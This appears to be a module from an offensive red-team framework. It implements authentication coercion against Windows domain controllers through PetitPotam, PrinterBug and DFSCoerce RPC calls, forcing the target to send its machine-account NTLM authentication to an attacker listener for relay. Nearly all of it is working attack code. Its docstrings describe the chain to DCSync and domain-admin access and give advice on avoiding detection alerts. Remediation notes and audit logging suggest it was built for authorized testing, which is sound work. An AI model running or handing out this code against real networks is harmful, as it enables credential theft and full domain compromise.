"""
Authentication Coercion — ad.coerce
MITRE: T1187 — Forced Authentication

Forces a target machine (typically DC) to authenticate to an attacker-controlled
listener via three RPC methods. Used with lateral.smb_relay to capture and relay
the machine account's NTLM hash.

Three coercion methods:
  PetitPotam  (MS-EFSRPC)  — EfsRpcOpenFileRaw, works unauthenticated on unpatched
  PrinterBug  (MS-RPRN)    — RpcRemoteFindFirstPrinterChangeNotification, needs domain creds
  DFSCoerce   (MS-DFSNM)   — NetrDfsAddStdRoot, needs domain creds

Attack chain:
  lateral.smb_relay running (listener on attacker IP:445) →
  ad.coerce forces DC to authenticate →
  smb_relay captures DC machine account NTLM →
  relay to LDAP/SMB for DA-level access or DCSync

OPSEC: HIGH — MS-EFSRPC/MS-RPRN RPC call triggers MDI alert within seconds.
       Blocked in STEALTH profile. Always use with smb_relay active.
"""
from __future__ import annotations

import asyncio
from typing import Any

from ares.core.campaign import Finding, Severity, NoiseProfile
from ares.core.logger import audit, get_logger
from ares.core.security import sanitize_hostname, sanitize_ldap
from ares.modules.base import BaseModule, OpsecLevel
from ares.core.tracing import trace_module

logger = get_logger("ares.modules.ad.coerce")


class CoerceModule(BaseModule):
    """
    ad.coerce — Force target to authenticate to attacker listener via PetitPotam (MS-EFSRPC

    OPSEC: HIGH_NOISE
    MITRE: "T1187"
    OUTPUTS:  "coercion_sent"
    """
    MODULE_ID          = "ad.coerce"
    MODULE_NAME        = "Authentication Coercion"
    MODULE_CATEGORY    = "ad"
    MODULE_DESCRIPTION = (
        "Force target to authenticate to attacker listener via "
        "PetitPotam (MS-EFSRPC), PrinterBug (MS-RPRN), or DFSCoerce (MS-DFSNM). "
        "Use with lateral.smb_relay to capture/relay machine account NTLM."
    )
    OPSEC_LEVEL        = OpsecLevel.HIGH_NOISE
    MIN_NOISE_PROFILE  = "normal"   # blocked in STEALTH
    REQUIRES           = []
    OUTPUTS            = ["coercion_sent"]
    MITRE_TECHNIQUES   = ["T1187"]
    MODULE_AUTHOR      = "ARES Team <team@ares-framework.io>"

    async def validate(self, ctx: "Any") -> None:
        await super().validate(ctx)
        from ares.core.context import ExecutionContext
        from ares.core.errors import ModuleValidationError
        if not isinstance(ctx, ExecutionContext):
            return

        # Stealth block — MDI triggers in seconds
        noise = getattr(getattr(ctx, "campaign", None), "noise_profile", None)
        if noise == NoiseProfile.STEALTH:
            raise ModuleValidationError(
                "ad.coerce is blocked in STEALTH profile — "
                "MS-EFSRPC/MS-RPRN RPC calls trigger Microsoft Defender for Identity "
                "alerts within seconds. Use NORMAL or AGGRESSIVE profile.",
                module_id=self.MODULE_ID, field="noise_profile",
            )

        ad = self._extract_ad_params(ctx)
        if not ad["dc"]:
            raise ModuleValidationError(
                "ad.coerce requires 'dc' — IP of the target to coerce.",
                module_id=self.MODULE_ID, field="dc",
            )
        if not ctx.params.get("listener_ip"):
            raise ModuleValidationError(
                "ad.coerce requires 'listener_ip' — IP of your smb_relay listener. "
                "Start lateral.smb_relay first, then run ad.coerce.",
                module_id=self.MODULE_ID, field="listener_ip",
            )

    async def execute(self, ctx: "Any") -> "ModuleResult":
        """ExecutionContext-based entry point (v0.9.0+).
        Thin adapter: extract params from ctx → call run() → return ModuleResult.
        """
        from ares.modules.base import ModuleResult
        ad = self._extract_ad_params(ctx)
        if getattr(ctx, "dry_run", False):
            return ModuleResult(status="dry_run", module_id=self.MODULE_ID,
                                raw={"dry_run": True})

        listener_ip = ctx.params.get("listener_ip", "")
        method      = ctx.params.get("method", "auto")   # auto|petitpotam|printerbug|dfscoerce

        findings, raw = await self.run(
            dc=ad["dc"], username=ad["username"], password=ad["password"],
            domain=ad["domain"], listener_ip=listener_ip, method=method,
        )
        return ModuleResult(
            status="success" if findings else "partial",
            findings=findings, raw=raw, module_id=self.MODULE_ID,
            execution_id=getattr(ctx, "execution_id", ""),
        )

    @trace_module("ad.coerce")
    async def run(self, dc: str, listener_ip: str, username: str = "",
                  password: str = "", domain: str = "",
                  method: str = "auto", **kwargs: Any):
        dc          = sanitize_hostname(dc)
        listener_ip = sanitize_hostname(listener_ip)

        await self.before_request(dc, "default")
        logger.warning("coerce_start",
                       target=dc, listener=listener_ip, method=method,
                       msg="HIGH_NOISE — TRIGGERS_MDI")
        audit("authentication_coercion", actor=username or "operator",
              technique="T1187", source="operator",
              target=dc, detail=f"listener={listener_ip} method={method}")

        loop   = asyncio.get_running_loop()
        result = {"sent": False, "method": None, "error": None}

        # Method priority: auto tries PetitPotam first (no creds needed), then PrinterBug
        methods_to_try: list[str] = []
        if method == "auto":
            methods_to_try = ["petitpotam", "printerbug", "dfscoerce"]
        else:
            methods_to_try = [method]

        for m in methods_to_try:
            try:
                if m == "petitpotam":
                    sent = await loop.run_in_executor(
                        None,
                        lambda: self._petitpotam_sync(dc, listener_ip, username, password, domain),
                    )
                elif m == "printerbug":
                    if not username:
                        continue
                    sent = await loop.run_in_executor(
                        None,
                        lambda: self._printerbug_sync(dc, listener_ip, username, password, domain),
                    )
                elif m == "dfscoerce":
                    if not username:
                        continue
                    sent = await loop.run_in_executor(
                        None,
                        lambda: self._dfscoerce_sync(dc, listener_ip, username, password, domain),
                    )
                else:
                    continue

                if sent:
                    result["sent"]   = True
                    result["method"] = m
                    logger.info("coerce_sent", target=dc, method=m, listener=listener_ip)
                    break

            except Exception as exc:
                result["error"] = str(exc)[:150]
                logger.debug("coerce_method_failed", method=m, error=str(exc)[:80])
                continue

        if result["sent"]:
            self.finding(
                title       = f"Authentication Coercion Sent to {dc} via {result['method']}",
                description = (
                    f"Successfully forced {dc} to authenticate to {listener_ip} "
                    f"via {result['method']}. "
                    "If lateral.smb_relay is listening, the machine account NTLM hash "
                    "should now be captured. Relay to LDAP for DCSync rights or SMB for DA."
                ),
                severity    = Severity.CRITICAL,
                mitre_technique = "T1187",
                mitre_tactic    = "Credential Access",
                evidence = {
                    "target":          dc,
                    "listener":        listener_ip,
                    "method":          result["method"],
                    "next_step":       "Check lateral.smb_relay output for captured NTLM hash",
                },
                remediation = (
                    "Patch MS-EFSRPC (KB5005413 / disabling EFS on DCs). "
                    "Disable Print Spooler service on DCs (PrinterBug mitigation). "
                    "Enable Protected Users security group for all DC accounts."
                ),
                host = dc, confidence = 0.95,
            )
        else:
            self.finding(
                title       = f"Coercion Attempted on {dc} — No Confirmation",
                description = (
                    "Authentication coercion RPC call sent but no confirmation received. "
                    "Check lateral.smb_relay for captured credentials."
                ),
                severity    = Severity.MEDIUM,
                mitre_technique = "T1187",
                mitre_tactic    = "Credential Access",
                evidence    = {"target": dc, "listener": listener_ip, "error": result.get("error")},
                remediation = "Monitor DC event logs for MS-EFSRPC/MS-RPRN calls.",
                host = dc, confidence = 0.5,
            )

        raw = {
            "target": dc, "listener": listener_ip,
            "method": result["method"], "sent": result["sent"],
            "error": result.get("error"),
        }
        raw["coercion_sent"] = raw.get("sent", False)  # OUTPUTS key
        return self._findings[:], raw

    def _petitpotam_sync(self, dc: str, listener_ip: str,
                          username: str, password: str, domain: str) -> bool:
        """MS-EFSRPC: EfsRpcOpenFileRaw — works unauthenticated on unpatched systems."""
        try:
            from impacket.dcerpc.v5 import transport, efsrpc
            from impacket.dcerpc.v5.dtypes import NULL

            rpctransport = transport.DCERPCTransportFactory(
                f"ncacn_np:{dc}[\\pipe\\lsarpc]"
            )
            rpctransport.set_connect_timeout(10)
            if username and password:
                rpctransport.set_credentials(username, password, domain, "", "", None)

            dce = rpctransport.get_dce_rpc()
            dce.connect()
            dce.bind(efsrpc.MSRPC_UUID_EFSR)

            # Coerce DC to authenticate to listener via UNC path
            unc_path = f"\\\\{listener_ip}\\share\\file"
            try:
                efsrpc.hEfsRpcOpenFileRaw(dce, unc_path, 0)
            except Exception:
                pass   # expected — DC will attempt auth before this fails
            finally:
                try:
                    dce.disconnect()
                except Exception:
                    pass
            return True
        except Exception as exc:
            logger.debug("petitpotam_failed", error=str(exc)[:80])
            return False

    def _printerbug_sync(self, dc: str, listener_ip: str,
                          username: str, password: str, domain: str) -> bool:
        """MS-RPRN: RpcRemoteFindFirstPrinterChangeNotification — needs domain creds."""
        try:
            from impacket.dcerpc.v5 import transport, rprn

            rpctransport = transport.DCERPCTransportFactory(
                f"ncacn_np:{dc}[\\pipe\\spoolss]"
            )
            rpctransport.set_connect_timeout(10)
            rpctransport.set_credentials(username, password, domain, "", "", None)

            dce = rpctransport.get_dce_rpc()
            dce.connect()
            dce.bind(rprn.MSRPC_UUID_RPRN)

            # Open printer on target
            resp = rprn.hRpcOpenPrinter(dce, f"\\\\{dc}")
            handle = resp["pHandle"]

            # Trigger auth to listener
            try:
                rprn.hRpcRemoteFindFirstPrinterChangeNotificationEx(
                    dce, handle, 0x00000100, 0, f"\\\\{listener_ip}", NULL
                )
            except Exception:
                pass   # expected error — trigger happened
            finally:
                try:
                    rprn.hRpcClosePrinter(dce, handle)
                    dce.disconnect()
                except Exception:
                    pass
            return True
        except Exception as exc:
            logger.debug("printerbug_failed", error=str(exc)[:80])
            return False

    def _dfscoerce_sync(self, dc: str, listener_ip: str,
                         username: str, password: str, domain: str) -> bool:
        """MS-DFSNM: NetrDfsAddStdRoot — needs domain creds."""
        try:
            from impacket.dcerpc.v5 import transport, dfsnm

            rpctransport = transport.DCERPCTransportFactory(
                f"ncacn_np:{dc}[\\pipe\\netdfs]"
            )
            rpctransport.set_connect_timeout(10)
            rpctransport.set_credentials(username, password, domain, "", "", None)

            dce = rpctransport.get_dce_rpc()
            dce.connect()
            dce.bind(dfsnm.MSRPC_UUID_DFSNM)

            try:
                dfsnm.hNetrDfsAddStdRoot(dce, f"\\\\{listener_ip}\\share", "share", 0)
            except Exception:
                pass   # expected — trigger happened
            finally:
                try:
                    dce.disconnect()
                except Exception:
                    pass
            return True
        except Exception as exc:
            logger.debug("dfscoerce_failed", error=str(exc)[:80])
            return False
